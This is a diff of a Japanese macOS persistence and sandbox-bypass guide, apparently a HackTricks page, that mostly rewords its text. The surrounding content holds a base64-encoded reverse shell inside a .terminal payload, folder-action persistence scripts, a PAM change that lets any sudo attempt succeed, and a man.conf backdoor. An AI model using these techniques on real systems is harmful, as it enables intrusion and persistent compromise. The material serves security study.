@@ -17,7 +17,7 @@
 ## サンドボックス回避
 
 {% hint style="success" %}
-ここでは、**サンドボックス回避**に役立つ起動場所を見つけることができます。これにより、単純に**ファイルに書き込んで待機**し、非常に**一般的なアクション**、決まった**時間**、または通常はルート権限を必要としない**アクション**を実行できます。
+ここでは、**サンドボックス回避**に役立つ起動場所を見つけることができます。これにより、単純に**ファイルに書き込んで待機**するだけで、非常に**一般的なアクション**、決まった**時間**、または通常はルート権限を必要としない**アクション**を実行できます。
 {% endhint %}
 
 ### Launchd
@@ -45,7 +45,7 @@
 
 #### 説明と攻撃手法
 
-**`launchd`**は、OX Sカーネルによって起動時に実行される**最初のプロセス**であり、シャットダウン時に終了する最後のプロセスです。常に**PID 1**を持つべきです。このプロセスは、以下の場所にある**ASEP** **plists**で指定された設定を**読み取り、実行**します。
+**`launchd`**は、OX Sカーネルによって起動時に最初に実行され、シャットダウン時に最後に終了する**最初のプロセス**です。常に**PID 1**を持つべきです。このプロセスは、以下の**ASEP** **plists**に示された設定を**読み取り**、**実行**します。
 
 * `/Library/LaunchAgents`: 管理者によってインストールされたユーザーごとのエージェント
 * `/Library/LaunchDaemons`: 管理者によってインストールされたシステム全体のデーモン
@@ -86,7 +86,7 @@
 `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`を実行して、**エージェント**または**デーモン**が**実行されるのを妨げる**（オーバーライドなど）**何もないことを確認**してください。
 {% endhint %}
 
-現在のユーザーによってロードされているすべてのエージェントとデーモンをリストアップします：
+現在のユーザーによってロードされたすべてのエージェントとデーモンをリストアップします：
 ```bash
 launchctl list
 ```
@@ -217,7 +217,7 @@ plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
 ```
 {% endcode %}
 
-### ターミナルスクリプト
+### ターミナルスクリプト / その他のファイル拡張子
 
 * サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
 
@@ -230,7 +230,7 @@ plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
 
 [**`.terminal`** スクリプト](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx)を作成して開くと、**ターミナルアプリケーション**が自動的に起動し、そこに指定されたコマンドが実行されます。ターミナルアプリに特別な権限（TCCなど）がある場合、コマンドはその特別な権限で実行されます。
 
-以下を試してみてください:
+以下のコマンドで試してみてください:
 ```bash
 # Prepare the payload
 cat > /tmp/test.terminal << EOF
@@ -258,8 +258,10 @@ open /tmp/test.terminal
 # Use something like the following for a reverse shell:
 <string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
 ```
+また、**`.command`**、**`.tool`**の拡張子を使用することもできます。通常のシェルスクリプトの内容であれば、ターミナルで開くことができます。
+
 {% hint style="danger" %}
-ターミナルに**フルディスクアクセス**がある場合、そのアクションを完了することができます（実行されたコマンドはターミナルウィンドウに表示されます）。
+ターミナルに**フルディスクアクセス**がある場合、そのアクションを完了することができます（実行されるコマンドはターミナルウィンドウに表示されます）。
 {% endhint %}
 
 ### オーディオプラグイン
@@ -283,7 +285,7 @@ open /tmp/test.terminal
 
 #### 説明
 
-以前の解説によると、いくつかのオーディオプラグインを**コンパイル**してロードすることが可能です。
+以前の解説によれば、いくつかのオーディオプラグインを**コンパイル**してロードすることが可能です。
 
 ### QuickLookプラグイン
 
@@ -301,14 +303,14 @@ open /tmp/test.terminal
 
 #### 説明と攻撃手法
 
-QuickLookプラグインは、ファイルのプレビューを**トリガー**（Finderでファイルを選択した状態でスペースバーを押す）すると実行され、そのファイルタイプをサポートする**プラグイン**がインストールされている場合に実行されます。
+QuickLookプラグインは、ファイルのプレビューを**トリガー**（Finderでファイルを選択した状態でスペースバーを押す）すると、**そのファイルタイプをサポートするプラグイン**がインストールされている場合に実行されます。
 
 独自のQuickLookプラグインをコンパイルし、前述のいずれかの場所に配置し、サポートされているファイルに移動してスペースを押すことでトリガーすることが可能です。
 
 ### ~~ログイン/ログアウトフック~~
 
 {% hint style="danger" %}
-私にはうまくいきませんでした。ユーザーログインフックもルートログアウトフックも機能しませんでした。
+私にはうまく動作しませんでした。ユーザーログインフックもルートログアウトフックも機能しませんでした。
 {% endhint %}
 
 **解説**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)
@@ -317,8 +319,8 @@ QuickLookプラグインは、ファイルのプレビューを**トリガー**�
 
 #### 位置
 
-* `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`のようなコマンドを実行できる必要があります
-* `~/Library/Preferences/com.apple.loginwindow.plist`にあります
+* `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`のようなコマンドを実行できる必要があります。
+* `~/Library/Preferences/com.apple.loginwindow.plist`にあります。
 
 これらは非推奨ですが、ユーザーがログインしたときにコマンドを実行するために使用することができます。
 ```bash
@@ -439,11 +441,11 @@ The following are the common auto start locations in macOS:
 
 To verify the auto start locations on a macOS system, you can use the following methods:
 
-1. **Manual Inspection**: You can manually inspect the contents of the auto start locations using the Terminal or Finder. Look for any suspicious or unfamiliar files that may indicate the presence of malicious software.
+1. **Manual Inspection**: You can manually inspect the contents of the auto start locations using the Terminal or Finder. Look for any suspicious or unfamiliar files or entries.
 
-2. **Command Line Tools**: macOS provides command line tools such as `launchctl` and `ls` that can be used to list and manage the auto start locations. These tools can help you identify and remove unwanted auto start entries.
+2. **Command Line Tools**: You can use command line tools such as `launchctl` and `ls` to list and inspect the contents of the auto start locations.
 
-3. **Third-Party Tools**: There are several third-party tools available that can scan and analyze the auto start locations for potential security issues. These tools can provide additional insights and automate the detection process.
+3. **Third-Party Tools**: There are several third-party tools available that can help you identify and manage auto start locations on macOS.
 
 ## Conclusion
 
@@ -468,7 +470,7 @@ EOF
 ```bash
 do shell script "touch /tmp/iterm2-autolaunchscpt"
 ```
-**`~/Library/Preferences/com.googlecode.iterm2.plist`**にあるiTerm2の設定は、iTerm2ターミナルが開かれたときに実行するコマンドを示すことができます。
+**`~/Library/Preferences/com.googlecode.iterm2.plist`**にあるiTerm2の設定ファイルは、iTerm2ターミナルが開かれたときに実行するコマンドを示すことができます。
 
 この設定はiTerm2の設定で構成することができます：
 
@@ -605,22 +607,22 @@ osascript -e 'tell application "System Events" to delete login item "itemname"'
 
 （ログインアイテムに関する前のセクションを確認してください。これは拡張です）
 
-**ZIP**ファイルを**ログインアイテム**として保存すると、**`Archive Utility`**がそれを開きます。たとえば、ZIPが**`~/Library`**に保存され、フォルダ**`LaunchAgents/file.plist`**がバックドアを含んでいる場合、そのフォルダが作成され（デフォルトでは作成されません）、plistが追加されます。したがって、次回ユーザーが再ログインすると、plistで指定された**バックドアが実行されます**。
+**ZIP**ファイルを**ログインアイテム**として保存すると、**`Archive Utility`**がそれを開きます。たとえば、ZIPが**`~/Library`**に保存され、フォルダ**`LaunchAgents/file.plist`**にバックドアが含まれている場合、そのフォルダが作成され（デフォルトでは作成されません）、plistが追加されます。したがって、次回ユーザーが再ログインすると、plistで指定された**バックドアが実行されます**。
 
-別のオプションとして、ユーザーのホームディレクトリに**`.bash_profile`**と**`.zshenv`**ファイルを作成することもできます。したがって、LaunchAgentsフォルダが既に存在する場合でも、このテクニックは機能します。
+別のオプションとして、ユーザーのホームディレクトリに**`.bash_profile`**と**`.zshenv`**というファイルを作成することもできます。したがって、LaunchAgentsフォルダが既に存在する場合でも、このテクニックは機能します。
 
 ### At
 
 解説: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.github.io/beyond/beyond\_0014/)
 
-#### 位置
+#### 場所
 
 * **`at`**を**実行する**必要があり、**有効化**されている必要があります。
 
 #### **説明**
 
 「atタスク」は、**特定の時間にタスクをスケジュールする**ために使用されます。\
-これらのタスクはcronと異なり、**一度だけ実行された後に削除**される**一時的なタスク**です。ただし、システムの再起動後も残るため、潜在的な脅威として排除することはできません。
+これらのタスクはcronと異なり、**一度だけ実行された後に削除される**一時的なタスクです。ただし、システムの再起動後も残るため、潜在的な脅威として排除することはできません。
 
 **デフォルトでは**無効ですが、**root**ユーザーは次のコマンドで**有効化**できます:
 ```bash
@@ -709,8 +711,8 @@ total 32
 フォルダーアクションスクリプトは、アタッチされているフォルダにアイテムが追加または削除された場合、またはウィンドウが開かれたり閉じられたり移動したりサイズが変更されたりすると実行されます。
 
 * Finder UIを介してフォルダを開く
-* フォルダにファイルを追加する（ドラッグ＆ドロップやターミナルからのシェルプロンプトでも可能）
-* フォルダからファイルを削除する（ドラッグ＆ドロップやターミナルからのシェルプロンプトでも可能）
+* フォルダにファイルを追加する（ドラッグ＆ドロップまたはターミナルからのシェルプロンプトでも可能）
+* フォルダからファイルを削除する（ドラッグ＆ドロップまたはターミナルからのシェルプロンプトでも可能）
 * UIを介してフォルダから移動する
 
 これを実装する方法はいくつかあります。
@@ -719,7 +721,9 @@ total 32
 2. フォルダを右クリックし、「フォルダーアクションの設定...」を選択し、「サービスを実行」を選択し、スクリプトを手動でアタッチします。
 3. OSAScriptを使用して、Apple Eventメッセージを`System Events.app`に送信し、新しい`フォルダーアクション`をプログラムでクエリおよび登録します。
 
-* これは、OSAScriptを使用して`System Events.app`にApple Eventメッセージを送信することで永続性を実装する方法です。
+
+
+* `System Events.app`にApple Eventメッセージを送信するOSAScriptを使用して永続性を実装する方法です。
 
 実行されるスクリプトは次のとおりです：
 
@@ -746,23 +750,17 @@ tell application "Finder"
     end if
     try
         set currentScripts to scripts of folder folderPath
-        set scriptExists to false
         repeat with currentScript in currentScripts
-            if path of currentScript is scriptPath then
-                set scriptExists to true
-                exit repeat
+            if name of currentScript is equal to "folder" then
+                remove currentScript
             end if
         end repeat
-        if not scriptExists then
-            make new script file at folderPath with properties {name:"folder", contents:scriptPath}
-        end if
-    on error
-        make new script file at folderPath with properties {name:"folder", contents:scriptPath}
     end try
+    make new script file at folderPath with properties {name:"folder", contents:scriptPath}
 end tell
 ```
 
-このスクリプトは、指定したフォルダにフォルダアクションを有効にし、以前にコンパイルされたスクリプトを添付します。フォルダアクションは、指定したフォルダ内で発生する特定のイベントに対して自動的にスクリプトを実行する機能です。
+このスクリプトを実行すると、指定したフォルダにフォルダアクションが有効になり、以前にコンパイルされたスクリプトが添付されます。
 ```javascript
 var se = Application("System Events");
 se.folderActionsEnabled = true;
@@ -775,7 +773,7 @@ fa.scripts.push(myScript);
 
 
 
-* これはGUIを介して永続性を実装する方法です：
+* これはGUIを介してこの永続性を実装する方法です：
 
 実行されるスクリプトは次のとおりです：
 
@@ -805,7 +803,7 @@ mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
 
 この設定は、**base64形式で保存された**`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`に保存されています。
 
-次に、GUIアクセスなしでこの永続化を準備してみましょう。
+次に、GUIアクセスなしでこの永続化を準備してみましょう：
 
 1. **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**をバックアップするために`/tmp`にコピーします：
 * `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
@@ -1105,9 +1103,9 @@ NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
 #### 説明と攻撃手法
 
 スポットライトは、macOSの組み込みの検索機能であり、ユーザーがコンピュータ上のデータに迅速かつ包括的にアクセスできるように設計されています。\
-この迅速な検索機能を実現するために、スポットライトは**専用のデータベース**を維持し、ほとんどのファイルを**解析してインデックスを作成**し、ファイル名とその内容の両方を素早く検索することができます。
+この迅速な検索機能を実現するために、スポットライトは**独自のデータベース**を維持し、ほとんどのファイルを**解析してインデックスを作成**し、ファイル名とその内容の両方を素早く検索することができます。
 
-スポットライトの基本的なメカニズムは、'mds'という中央プロセスによって実現されており、これは**'メタデータサーバ'**の略です。このプロセスはスポットライトサービス全体を統括しています。これに加えて、複数の'mdworker'デーモンがあり、さまざまなメンテナンスタスクを実行します（`ps -ef | grep mdworker`で確認できます）。これらのタスクは、スポットライトのインポータープラグインまたは**".mdimporterバンドル"**によって可能になり、さまざまなファイル形式のコンテンツを理解してインデックス化することができます。
+スポットライトの基本的なメカニズムは、'mds'という中央プロセスによって実現されており、これは**'メタデータサーバ'**を表しています。このプロセスはスポットライトサービス全体を統括しています。これに加えて、複数の'mdworker'デーモンがあり、さまざまなメンテナンスタスクを実行しています（`ps -ef | grep mdworker`で確認できます）。これらのタスクは、スポットライトのインポータープラグインまたは**".mdimporterバンドル"**によって可能になり、さまざまなファイル形式のコンテンツを理解してインデックス化することができます。
 
 プラグインまたは**`.mdimporter`**バンドルは、前述の場所に配置されており、新しいバンドルが現れるとすぐにロードされます（サービスの再起動は不要です）。これらのバンドルは、管理できる**ファイルタイプと拡張子**を示さなければなりません。このようにして、スポットライトは、指定された拡張子を持つ新しいファイルが作成されたときにこれらのバンドルを使用します。
 
@@ -1257,7 +1255,7 @@ monthly_local="/etc/monthly.local"			# Local scripts
 もし、`/etc/daily.local`、`/etc/weekly.local`、または`/etc/monthly.local`のいずれかのファイルを書き込むことができれば、**遅かれ早かれ実行されます**。
 
 {% hint style="warning" %}
-定期スクリプトは、スクリプトの所有者として**実行される**ことに注意してください。したがって、通常のユーザーがスクリプトを所有している場合、そのユーザーとして実行されます（これにより特権エスカレーション攻撃が防止される場合があります）。
+定期スクリプトは、スクリプトの所有者として**実行される**ことに注意してください。したがって、通常のユーザーがスクリプトの所有者である場合、そのユーザーとして実行されます（これにより特権エスカレーション攻撃が防止される場合があります）。
 {% endhint %}
 
 ### PAM
@@ -1295,7 +1293,7 @@ account    required       pam_permit.so
 password   required       pam_deny.so
 session    required       pam_permit.so
 ```
-したがって、**`sudo`を使用する試みはすべて成功します**。
+したがって、**`sudo`を使用する試みは成功します**。
 
 {% hint style="danger" %}
 このディレクトリはTCCによって保護されているため、ユーザーはアクセスを求めるプロンプトが表示される可能性が非常に高いことに注意してください。
@@ -1373,12 +1371,12 @@ security authorize com.asdf.asdf
 #### 場所
 
 * **`/private/etc/man.conf`**
-* rootが必要
+* rootが必要です
 * **`/private/etc/man.conf`**：manが使用されるたびに
 
 #### 説明とエクスプロイト
 
-設定ファイル**`/private/etc/man.conf`**は、manドキュメントファイルを開く際に使用するバイナリ/スクリプトを示しています。したがって、実行可能ファイルのパスを変更することで、ユーザーがmanを使用してドキュメントを読むたびにバックドアが実行されます。
+設定ファイル**`/private/etc/man.conf`**は、manドキュメントファイルを開く際に使用するバイナリ/スクリプトを示しています。したがって、実行ファイルのパスを変更することで、ユーザーがドキュメントを読むためにmanを使用するたびにバックドアが実行されます。
 
 例えば、**`/private/etc/man.conf`**に設定する：
 ```
@@ -1507,7 +1505,7 @@ RunService "$1"
 ### emond
 
 {% hint style="danger" %}
-私のmacOSにはこのコンポーネントが見つかりませんので、詳細はwriteupを確認してください。
+私のmacOSにはこのコンポーネントが見つかりませんので、詳細についてはwriteupを確認してください。
 {% endhint %}
 
 Writeup: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)
@@ -1535,15 +1533,15 @@ XQuartzは**もはやmacOSにインストールされていない**ため、詳�
 ### ~~kext~~
 
 {% hint style="danger" %}
-ルートとしてkextをインストールするのは非常に複雑なので、サンドボックスからの脱出や持続性のためには考慮しないでください（エクスプロイトがある場合を除く）
+ルートとしてさえkextをインストールするのは非常に複雑なので、サンドボックスからの脱出や持続性のためには考慮しないでください（エクスプロイトがある場合を除く）
 {% endhint %}
 
 #### 場所
 
-KEXTを起動アイテムとしてインストールするには、次のいずれかの場所に**インストールする必要があります**：
+KEXTをスタートアップアイテムとしてインストールするには、次のいずれかの場所に**インストールする必要があります**：
 
 * `/System/Library/Extensions`
-* OS Xオペレーティングシステムに組み込まれたKEXTファイル
+* OS Xオペレーティングシステムに組み込まれたKEXTファイル。
 * `/Library/Extensions`
 * サードパーティのソフトウェアによってインストールされたKEXTファイル
 
